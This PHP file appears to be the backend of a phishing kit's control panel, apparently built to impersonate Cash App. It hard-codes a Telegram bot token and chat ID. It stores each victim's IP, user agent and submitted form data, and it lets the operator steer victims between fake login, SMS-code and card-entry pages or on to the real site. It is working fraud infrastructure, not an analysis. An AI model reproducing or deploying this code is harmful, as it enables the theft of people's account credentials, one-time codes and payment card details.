<?php
$bot_token = '8162694486:AAE1I5GshQONo9HHHMA47hj8jxvhQP6m0';
$chat_id = '-4988787886';

define('PANEL_DATA_DIR', __DIR__ . '/data');

define('CONFIG_FILE', PANEL_DATA_DIR . '/config.json');

define('VISITORS_FILE', PANEL_DATA_DIR . '/visitors.json');

define('BLOCKED_IPS_FILE', PANEL_DATA_DIR . '/blocked_ips.json');

// Ensure data directory exists
if (!is_dir(PANEL_DATA_DIR)) {
    @mkdir(PANEL_DATA_DIR, 0777, true);
}

// Visitor management
function getVisitors() {
    if (!file_exists(VISITORS_FILE)) {
        @file_put_contents(VISITORS_FILE, '[]');
    }
    $data = @file_get_contents(VISITORS_FILE);
    return $data ? json_decode($data, true) : [];
}

function saveVisitors($visitors) {
    @file_put_contents(VISITORS_FILE, json_encode($visitors, JSON_PRETTY_PRINT));
}

function getBlockedIPs() {
    if (!file_exists(BLOCKED_IPS_FILE)) {
        @file_put_contents(BLOCKED_IPS_FILE, '[]');
    }
    $data = @file_get_contents(BLOCKED_IPS_FILE);
    return $data ? json_decode($data, true) : [];
}

function saveBlockedIPs($ips) {
    @file_put_contents(BLOCKED_IPS_FILE, json_encode($ips, JSON_PRETTY_PRINT));
}

function addVisitor($data) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $entry = [
        'id' => uniqid(),
        'ip' => $ip,
        'country' => $data['cc'] ?? 'XX',
        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'timestamp' => date('Y-m-d H:i:s'),
        'page' => $data['page'] ?? 'UNKNOWN',
        'status' => 'active',
        'form_data' => $data
    ];
    
    $visitors = getVisitors();
    $found = false;
    foreach ($visitors as &$existing) {
        if ($existing['ip'] === $ip) {
            $existing['page'] = $entry['page'];
            $existing['timestamp'] = $entry['timestamp'];
            $existing['form_data'] = array_merge($existing['form_data'] ?? [], $entry['form_data']);
            $found = true;
            break;
        }
    }
    if (!$found) {
        $visitors[] = $entry;
    }
    
    saveVisitors($visitors);
}

function checkRedirect($ip) {
    $visitors = getVisitors();
    foreach ($visitors as $visitor) {
        if ($visitor['ip'] === $ip && $visitor['status'] === 'redirected' && !empty($visitor['redirect_url'])) {
            return $visitor['redirect_url'];
        }
    }
    return null;
}

function getClientIP() {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = explode(',', $_SERVER[$k])[0];
            return trim($ip);
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function getConfig() {
    global $bot_token, $chat_id;
    
    if (!isset($bot_token) && file_exists(CONFIG_FILE)) {
        $cfg = json_decode(@file_get_contents(CONFIG_FILE), true) ?: [];
        $bot_token = $cfg['bot_token'] ?? '8162694486:AAE1I5GshQONo9HHHMA47hj8jxvhQP6m0';
        $chat_id = $cfg['chat_id'] ?? '-4988787886';
    }
    
    return ['bot_token' => $bot_token, 'chat_id' => $chat_id];
}

function saveConfig($data) {
    @file_put_contents(CONFIG_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

function getQuickRedirectUrl($ip, $page) {
    $visitors = getVisitors();
    $redirects = [
        'login' => '/log.html',
        'sms' => '/sms.html',
        'card' => '/c.html',
        'success' => '/success.html',
        'log_error' => '/log.html?error=1',
        'official' => 'https://cash.app'
    ];
    
    $target = $redirects[$page] ?? $page;
    if (strpos($target, 'http') !== 0 && strpos($target, '/') !== 0) {
        $target = '/' . $target;
    }
    
    foreach ($visitors as &$visitor) {
        if ($visitor['ip'] === $ip) {
            $visitor['redirect_url'] = $target;
            $visitor['status'] = 'redirected';
            $visitor['last_update'] = time();
            break;
        }
    }
    
    saveVisitors($visitors);
    
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    
    return "{$protocol}://{$host}{$target}";
}

function isIPBlocked($ip) {
    $blocked = getBlockedIPs();
    return in_array($ip, $blocked);
}

function blockIP($ip) {
    $blocked = getBlockedIPs();
    if (!in_array($ip, $blocked)) {
        $blocked[] = $ip;
        saveBlockedIPs($blocked);
    }
}

function deleteIP($ip) {
    $visitors = getVisitors();
    $updated = array_filter($visitors, function($v) use ($ip) {
        return $v['ip'] !== $ip;
    });
    
    saveVisitors(array_values($updated));
}

function clearAllVisitors() {
    saveVisitors([]);
}

function updateVisitorRedirect($id, $url) {
    $visitors = getVisitors();
    foreach ($visitors as &$visitor) {
        if ($visitor['id'] === $id) {
            $visitor['redirect_url'] = $url;
            $visitor['status'] = 'redirected';
            $visitor['last_update'] = time();
            break;
        }
    }
    
    saveVisitors($visitors);
}

function unblockIP($ip) {
    $blocked = getBlockedIPs();
    $blocked = array_filter($blocked, function($blocked_ip) use ($ip) {
        return $blocked_ip !== $ip;
    });
    
    saveBlockedIPs(array_values($blocked));
}

function saveVisitorRedirect($id, $url) {
    $visitors = getVisitors();
    foreach ($visitors as &$visitor) {
        if ($visitor['id'] === $id) {
            $visitor['redirect_url'] = $url;
            $visitor['status'] = 'redirected';
            $visitor['last_update'] = time();
            break;
        }
    }
    
    saveVisitors($visitors);
}

function addBlockedIP($ip) {
    $blocked = getBlockedIPs();
    if (!in_array($ip, $blocked)) {
        $blocked[] = $ip;
        saveBlockedIPs($blocked);
    }
}

function getVisitorRedirectInfo($id) {
    $visitors = getVisitors();
    foreach ($visitors as $visitor) {
        if ($visitor['id'] === $id) {
            return $visitor;
        }
    }
    return null;
}

function isConfigExists() {
    return file_exists(CONFIG_FILE);
}

function getConfigData() {
    return getConfig();
}

function saveConfigData($data) {
    saveConfig($data);
}
?>
